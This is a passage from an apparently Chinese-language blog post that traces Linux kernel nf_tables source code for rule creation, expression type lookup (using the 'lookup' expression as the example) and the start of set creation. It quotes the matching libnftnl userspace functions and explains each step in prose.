class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">trans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);</span><br><span class="line"><span class="keyword">if</span> (!trans) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_APPEND) &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line">chain-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (net-&gt;nft.validate_state == NFT_VALIDATE_DO)</span><br><span class="line"><span class="keyword">return</span> nft_table_validate(net, table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;flags &amp; NFT_CHAIN_HW_OFFLOAD) &#123;</span><br><span class="line">flow = nft_flow_rule_create(net, rule);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(flow))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(flow);</span><br><span class="line"></span><br><span class="line">nft_trans_flow_rule(trans) = flow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err2:</span><br><span class="line">nf_tables_rule_release(&amp;ctx, rule);</span><br><span class="line">err1:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (info[i].ops) &#123;</span><br><span class="line">module_put(info[i].ops-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">info[i].ops-&gt;type-&gt;release_ops(info[i].ops);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>nft_ctx_init</code>函数调用往前主要做的是找到已存在的table和chain以及rule</p><p>在<code>nft_ctx_init</code>函数调后之后会根据用户态是否设置了<code>nla[NFTA_RULE_EXPRESSIONS]</code>来选择是否给size加上所有expression的size，这里可以看到的是对size做运算的是<code>info[n].ops-&gt;size</code>，所以这里分析一下info的来源。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_expr_parse</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nlattr *nla,</span></span></span><br><span class="line"><span class="params"><span class="function">struct nft_expr_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_EXPR_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(tb, NFTA_EXPR_MAX, nla,</span><br><span class="line">  nft_expr_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">type = nft_expr_type_get(ctx-&gt;net, ctx-&gt;family, tb[NFTA_EXPR_NAME]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(type))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_EXPR_DATA]) &#123;</span><br><span class="line">err = nla_parse_nested_deprecated(info-&gt;tb, type-&gt;maxattr,</span><br><span class="line">  tb[NFTA_EXPR_DATA],</span><br><span class="line">  type-&gt;policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">memset</span>(info-&gt;tb, <span class="number">0</span>, <span class="keyword">sizeof</span>(info-&gt;tb[<span class="number">0</span>]) * (type-&gt;maxattr + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type-&gt;select_ops != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ops = type-&gt;select_ops(ctx,</span><br><span class="line">       (<span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> *)info-&gt;tb);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops)) &#123;</span><br><span class="line">err = PTR_ERR(ops);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN)</span><br><span class="line"><span class="keyword">if</span> (nft_expr_type_request_module(ctx-&gt;net,</span><br><span class="line"> ctx-&gt;family,</span><br><span class="line"> tb[NFTA_EXPR_NAME]) != -EAGAIN)</span><br><span class="line">err = -ENOENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">ops = type-&gt;ops;</span><br><span class="line"></span><br><span class="line">info-&gt;attr = nla;</span><br><span class="line">info-&gt;ops = ops;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err1:</span><br><span class="line">module_put(type-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到的是<code>info-&gt;ops</code>所赋值的ops是由type所决定的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> struct nft_expr_type *<span class="title">nft_expr_type_get</span><span class="params">(struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">     u8 family,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">type = __nft_expr_type_get(family, nla);</span><br><span class="line"><span class="keyword">if</span> (type != <span class="literal">NULL</span> &amp;&amp; try_module_get(type-&gt;owner))</span><br><span class="line"><span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">lockdep_nfnl_nft_mutex_not_held();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line"><span class="keyword">if</span> (type == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (nft_expr_type_request_module(net, family, nla) == -EAGAIN)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EAGAIN);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nft_request_module(net, <span class="string">&quot;nft-expr-%.*s&quot;</span>,</span><br><span class="line">       nla_len(nla),</span><br><span class="line">       (<span class="keyword">char</span> *)nla_data(nla)) == -EAGAIN)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOENT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而type是由上述函数产生的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *__<span class="title">nft_expr_type_get</span>(<span class="title">u8</span> <span class="title">family</span>,</span></span><br><span class="line"><span class="class">       <span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span>, *<span class="title">candidate</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(type, &amp;nf_tables_expressions, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nla_strcmp(nla, type-&gt;name)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!type-&gt;family &amp;&amp; !candidate)</span><br><span class="line">candidate = type;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (type-&gt;family == family)</span><br><span class="line">candidate = type;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> candidate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里主要是通过名字进行字符串判断来找到对应的type的，所以回到用户态来看其是如何产生的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exprs[exprid] = nftnl_expr_alloc(<span class="string">&quot;lookup&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct nftnl_expr *<span class="title">nftnl_expr_alloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">expr_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">ops = nftnl_expr_ops_lookup(name);</span><br><span class="line"><span class="keyword">if</span> (ops == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">expr = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(struct nftnl_expr) + ops-&gt;alloc_len);</span><br><span class="line"><span class="keyword">if</span> (expr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Manually set expression name attribute */</span></span><br><span class="line">expr-&gt;flags |= (<span class="number">1</span> &lt;&lt; NFTNL_EXPR_NAME);</span><br><span class="line">expr-&gt;ops = ops;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nftnl_expr_alloc);</span><br></pre></td></tr></table></figure><p>这里依旧是通过名字寻找到ops。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct expr_ops *<span class="title">nftnl_expr_ops_lookup</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (expr_ops[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(expr_ops[i]-&gt;name, name) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> expr_ops[i];</span><br><span class="line"></span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">expr_ops</span> *<span class="title">expr_ops</span>[] =</span> &#123;</span><br><span class="line">&amp;expr_ops_bitwise,</span><br><span class="line">&amp;expr_ops_byteorder,</span><br><span class="line">&amp;expr_ops_cmp,</span><br><span class="line">&amp;expr_ops_counter,</span><br><span class="line">&amp;expr_ops_ct,</span><br><span class="line">&amp;expr_ops_dup,</span><br><span class="line">&amp;expr_ops_exthdr,</span><br><span class="line">&amp;expr_ops_fwd,</span><br><span class="line">&amp;expr_ops_immediate,</span><br><span class="line">&amp;expr_ops_limit,</span><br><span class="line">&amp;expr_ops_log,</span><br><span class="line">&amp;expr_ops_lookup,</span><br><span class="line">&amp;expr_ops_masq,</span><br><span class="line">&amp;expr_ops_match,</span><br><span class="line">&amp;expr_ops_meta,</span><br><span class="line">&amp;expr_ops_ng,</span><br><span class="line">&amp;expr_ops_nat,</span><br><span class="line">&amp;expr_ops_notrack,</span><br><span class="line">&amp;expr_ops_payload,</span><br><span class="line">&amp;expr_ops_range,</span><br><span class="line">&amp;expr_ops_redir,</span><br><span class="line">&amp;expr_ops_reject,</span><br><span class="line">&amp;expr_ops_rt,</span><br><span class="line">&amp;expr_ops_queue,</span><br><span class="line">&amp;expr_ops_quota,</span><br><span class="line">&amp;expr_ops_target,</span><br><span class="line">&amp;expr_ops_dynset,</span><br><span class="line">&amp;expr_ops_hash,</span><br><span class="line">&amp;expr_ops_fib,</span><br><span class="line">&amp;expr_ops_objref,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的ops有以上这么多类，这里以开头的<code>lookup</code>为例，回到内核态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">nft_basic_types</span>[] =</span> &#123;</span><br><span class="line">&amp;nft_imm_type,</span><br><span class="line">&amp;nft_cmp_type,</span><br><span class="line">&amp;nft_lookup_type,</span><br><span class="line">&amp;nft_bitwise_type,</span><br><span class="line">&amp;nft_byteorder_type,</span><br><span class="line">&amp;nft_payload_type,</span><br><span class="line">&amp;nft_dynset_type,</span><br><span class="line">&amp;nft_range_type,</span><br><span class="line">&amp;nft_meta_type,</span><br><span class="line">&amp;nft_rt_type,</span><br><span class="line">&amp;nft_exthdr_type,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>内核也具有很多expression类型，从前面来看这里匹配的type则为<code>nft_lookup_type</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> <span class="title">nft_lookup_type</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;lookup&quot;</span>,</span><br><span class="line">.ops= &amp;nft_lookup_ops,</span><br><span class="line">.policy= nft_lookup_policy,</span><br><span class="line">.maxattr= NFTA_LOOKUP_MAX,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为其<code>select_ops</code>为空，所以最终得到的ops即为<code>nft_lookup_ops</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_lookup_ops</span> =</span> &#123;</span><br><span class="line">.type= &amp;nft_lookup_type,</span><br><span class="line">.size= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_lookup)),</span><br><span class="line">.eval= nft_lookup_eval,</span><br><span class="line">.init= nft_lookup_init,</span><br><span class="line">.activate= nft_lookup_activate,</span><br><span class="line">.deactivate= nft_lookup_deactivate,</span><br><span class="line">.destroy= nft_lookup_destroy,</span><br><span class="line">.dump= nft_lookup_dump,</span><br><span class="line">.validate= nft_lookup_validate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最终从这里得到size并加起来，回到<code>nf_tables_newrule</code>，接着会判断有无用户数据，如果有的话在申请rule时也会连带加上。紧接着就是对rule的一系列初始化操作。</p><p>最后判断新创建的rule是否为replace旧的rule，如果不是则判断其是插在最后还是开始。</p><h3 id="配置集合"><a href="#配置集合" class="headerlink" title="配置集合"></a>配置集合</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newset</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">    struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line">u64 size;</span><br><span class="line">u64 timeout;</span><br><span class="line">u32 ktype, dtype, flags, policy, gc_int, objtype;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *udata;</span><br><span class="line">u16 udlen;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TABLE] == <span class="literal">NULL</span> ||</span><br><span class="line">    nla[NFTA_SET_NAME] == <span class="literal">NULL</span> ||</span><br><span class="line">    nla[NFTA_SET_KEY_LEN] == <span class="literal">NULL</span> ||</span><br><span class="line">    nla[NFTA_SET_ID] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span 